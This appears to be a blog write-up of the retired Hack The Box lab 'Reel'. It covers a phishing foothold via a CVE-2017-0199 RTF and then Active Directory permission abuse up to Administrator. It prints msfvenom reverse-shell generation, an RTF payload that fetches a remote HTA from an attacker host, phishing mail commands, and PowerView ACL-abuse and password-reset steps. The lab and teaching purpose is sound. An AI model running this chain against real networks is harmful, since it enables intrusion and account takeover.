---
layout: post
title: "The Invoice You Open Yourself"
subtitle: "HTB Reel, where a polite request for RTF procedures becomes a phishing foothold, and a chain of Active Directory permissions walks you from a clerk to the king"
date: 2018-11-17 12:00:00 +0000
description: "Reel mails the box its own exploit. A readme asks for RTF files, so you send one that bites, then ride a chain of Active Directory permissions from a low clerk to Administrator."
image: /assets/og/the-invoice-you-open-yourself.png
tags: [hackthebox, writeup]
---

Reel does not break in. Reel gets invited. The box leaves a note on an open FTP server that says, in so many words, mail me any RTF procedures and I will review them, and that note is the whole front door. You do not find a bug in a web app or a buffer you can smash. You write a Word document that bites, you mail it to the address stamped in another file's metadata, and a simulated employee opens it because opening documents is his entire job. That is the foothold. The rest of the box is a different kind of climb, one with no memory corruption and no exploit binary at all. It is Active Directory permissions, person pointing at person pointing at group, and you walk that chain of who-can-edit-whom from a nobody named nico all the way to Administrator. The bug here is not in any one machine. The bug is the org chart.

```
        R E E L   S T U D I O S
        =======================
        ftp:  "mail me any .rtf procedures,
               i'll review them"   ← it means it.
                     |
                     v
        you mail an invoice that opens a shell.
        nico reads it. you are now nico.
                     |
        nico → tom → claire → Backup_Admins → ADMIN
        each arrow is a permission someone granted
        and forgot. follow the arrows. that's the box.
                                            幕
```

## 0x01 · the three doors

`nmap -sC -sV` against the box comes back almost insultingly short for a Windows machine. No web server, no SMB, just three ports.

```
PORT   STATE SERVICE  VERSION
21/tcp open  ftp      Microsoft ftpd
22/tcp open  ssh      OpenSSH 7.6 (Windows)
25/tcp open  smtp     Microsoft ESMTP
```

Read that lineup and a story starts forming. FTP and SMTP together are not a website. They are a mailroom. The box wants you to receive something and the box wants to send you something, and SSH on a Windows host means once you have a password you have a clean shell. There is no application to fuzz. The attack surface is correspondence.

## 0x02 · the note that asks to be exploited

The FTP server takes `anonymous`, and inside `/documents` sit a few Office files and a plain readme. The readme is the box handing you the script.

```
> ftp 10.10.10.77
Name: anonymous
ftp> ls documents
AppLocker.docx
readme.txt
Windows Event Forwarding.docx
```

`readme.txt` says, paraphrased, please email me any RTF format procedures and I will review and convert them. That is a person promising to open whatever you send. The `AppLocker.docx` file is a warning shot, it documents hash rules locking down `exe`, `msi`, and scripts like `ps1`, `vbs`, `cmd`, `bat`, and `js`, which tells you the obvious payloads are nailed shut and you will need a delivery the policy does not cover. And the last file is the gift. Pull its metadata.

```
> exiftool "Windows Event Forwarding.docx"
Creator    : nico@megabank.com
```

There is your target. A name, a mailbox, and a standing invitation. Picture a shop with a sign in the window that reads we taste-test any pie you bring us, no questions. You are not breaking the lock. You are baking.

## 0x03 · the document that bites

The RTF angle is CVE-2017-0199, and it is a beautiful piece of misplaced trust. An RTF can embed an OLE object, and one flavor of OLE object is a link that, the moment the document opens, reaches out over HTTP and fetches a file, then runs that file as an HTA, an HTML Application, which Windows treats as a fully trusted little script host. Think of it like a birthday card with a QR code printed inside. The card itself is harmless paper. But the instant you open it your phone scans the code, drives to a website, and runs whatever it finds, and you did all of that just by lifting the flap.

So you build two things. An HTA payload that calls home, and an RTF whose only purpose is to fetch that HTA on open. The payload generator does the first half.

```
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 \
    -f hta-psh -o iceberg.hta
```

That `iceberg.hta` is just a wrapper around [a PowerShell reverse shell calling back to 10.10.14.4 on 443]. Note why this slips past the AppLocker rules from the docx. The policy blocks `ps1` files and friends by hash, but an HTA fetched fresh over the wire and executed by `mshta` is a different beast walking through a different gap. Now wrap it in the RTF with the public CVE-2017-0199 toolkit, pointing the embedded link at your own web server.

```
# python cve-2017-0199_toolkit.py -M gen -w invoice.rtf \
    -u http://10.10.14.4/iceberg.hta -t rtf -x 0
```

`invoice.rtf` now looks like a boring document and behaves like a trap. Open it on a vulnerable Word and it quietly fetches your HTA and runs your shell. You have built the pie. Time to deliver it.

## 0x04 · the mail goes through

Port 25 is open and the readme promised a reader, so you stand up a listener and a web server, then send the mail straight at nico with the RTF attached.

```
# sendEmail -f iceberg@megabank.com -t nico@megabank.com \
    -u "Invoice attached" -m "overdue, please review" \
    -a invoice.rtf -s 10.10.10.77
```

Half a minute later the box does its part. nico's Word opens the attachment, the OLE link fires, your HTA lands, and the listener catches a shell.

```
# nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.77
C:\> whoami
htb\nico
```

You are inside, as nico, exactly the helpful person who said he would open anything you mailed. No password was guessed and no service was crashed. A human did his job and his job was the vulnerability.

## 0x05 · the credential nico left lying around

nico's desktop is holding a file that should never sit on a desktop, `cred.xml`. It is a serialized PowerShell credential object, the kind you get from piping a `Get-Credential` into `Export-CliXml`. People treat these as encrypted and safe to store, and they are encrypted, but only with DPAPI keys tied to the very user account you are now standing inside. Picture a diary written in a cipher, except the decoder ring is taped to the inside of the same drawer. If you can open the drawer, the cipher is decoration. So you decode it as nico, who owns the keys by definition.

```
PS C:\Users\nico\Desktop> $c = Import-CliXml -Path cred.xml
PS C:\Users\nico\Desktop> $c.GetNetworkCredential() | Format-List *
UserName : tom
Password : 1ts-mag1c!!!
Domain   : HTB
```

A second user, tom, with a cleartext password. SSH is open, so you trade your awkward HTA shell for a clean one.

```
# ssh tom@10.10.10.77
tom@10.10.10.77's password: 1ts-mag1c!!!
htb\tom C:\Users\tom>
```

## 0x06 · the map that draws the rest of the box

tom's profile has an `AD Audit` folder, and inside it sit BloodHound, its ingestor output, and a copy of PowerView. Somebody on this box was already auditing the directory and left the homework out. BloodHound is the tool that turns Active Directory's tangle of permissions into a graph, then runs shortest-path queries from where you stand to where you want to be. Think of it like a subway map for a city where the trains are who-is-allowed-to-edit-whom. You feed it the collected data, mark tom as owned, and ask it to draw a line to Domain Admin.

```
PS> Import-Module .\SharpHound.ps1   # or just load the collected acls
# upload the resulting data into BloodHound, mark tom owned,
# query: shortest path to high-value targets
```

The graph it draws is the entire endgame, three arrows long.

```
   tom  ──WriteOwner──▶  claire
   claire  ──WriteDACL──▶  Backup_Admins (group)
   Backup_Admins  ──(F) full control──▶  Administrator's files
```

Each arrow is a permission a tired admin granted once and never revoked. tom can make himself the owner of claire's account object. As her owner he can grant himself the right to reset her password. With her password he becomes claire, who has the right to rewrite the access list on the Backup_Admins group, which means she can add herself to it, and that group has full filesystem control over the Administrator's directory. None of this is an exploit. It is the directory faithfully enforcing rules nobody should have written.

## 0x07 · walking the arrows

Load PowerView and follow the graph one arrow at a time. First, tom seizes ownership of claire and grants himself the reset-password right, then sets her password to something he picks.

```
PS> . .\PowerView.ps1
PS> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
PS> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
PS> $p = ConvertTo-SecureString 'iceberg-Reset!23' -AsPlainText -Force
PS> Set-DomainUserPassword -Identity claire -AccountPassword $p
```

Now you are claire. SSH back in as her, then use her WriteDACL over the group to put her inside it.

```
# ssh claire@10.10.10.77
claire@10.10.10.77's password: iceberg-Reset!23

C:\> net group "Backup_Admins" claire /add
```

That membership only takes effect on a fresh login, so log out and back in. claire now wears the Backup_Admins badge, which grants full control over the contents of the Administrator's home directory.

## 0x08 · the password in the script

You might lunge straight for `root.txt` now, and the box slaps your hand. The flag carries an explicit deny entry against Backup_Admins, a tidy little nudge that says the membership is the means, not the end.

```
C:\Users\Administrator\Desktop> icacls root.txt
root.txt  HTB\Backup_Admins:(DENY)(R)
```

But the rest of that desktop is readable, and there is a `Backup Scripts` folder, which is exactly the kind of place where automation parks a password so a scheduled job can log in unattended. Open `BackupScript.ps1` and read the comments.

```
PS> type "C:\Users\Administrator\Desktop\Backup Scripts\BackupScript.ps1"
...
# admin password
$password = "Cr4ckMeIfYouC4n!"
```

A cleartext domain administrator password, written into a script and left where the backup group could reach it, which is the whole reason that group existed. The deny on the flag was a wall. The script was the door three feet to the left. SSH in as the administrator and the box is done.

```
# ssh administrator@10.10.10.77
administrator@10.10.10.77's password: Cr4ckMeIfYouC4n!
htb\administrator C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x09 · the honest caveat

It is tempting to file the foothold under patch your Word and move on, and yes, CVE-2017-0199 is long fixed. But the foothold was never really the Word bug. The foothold was a published invitation. A readme that promised to open attachments turned a stranger's file into a trusted action, and no patch closes a door that a person keeps propping open on purpose. Phishing does not work because software is broken. It works because a human's job is to be helpful, and helpful is a lever.

The privilege escalation is the part that should keep an admin up at night, because not one step of it was a vulnerability in the ordinary sense. Every arrow on that BloodHound graph was a deliberate grant. Someone gave tom power over claire, gave claire power over a group, gave that group power over the boss's files, each for a reason that made sense on a Tuesday, and the directory simply remembered all of it forever. Permissions accumulate like junk in a drawer. Individually each one is harmless and explainable. Stacked, they form a staircase from the lobby to the penthouse, and BloodHound's only magic is that it can see the whole staircase at once while the people who built it could only ever see one step. You cannot patch this. You can only audit it, and then have the nerve to take the permissions back.

And note where the secrets kept hiding. An encrypted credential on a desktop, a password in a backup script. Both were stored by someone who believed encrypted or internal meant safe. A secret a process can read automatically is a secret an intruder can read too, the moment they become that process.

## 0x0a · outro

```
the box asked you to mail it a document.
so you mailed it one that opened a shell.

then you walked a hallway of unlocked doors,
each one held open by a permission nobody revoked,
until the one at the end was the boss's.

phish the willing. map the grants. wear black.

                                                            EOF
```

---

*HTB: Reel, retired 10 Nov 2018. A hard Windows box that is really a lecture on two things software cannot patch, a human who opens his mail and a directory that never forgets a favor. The invoice still opens in a lab and nowhere you don't own.*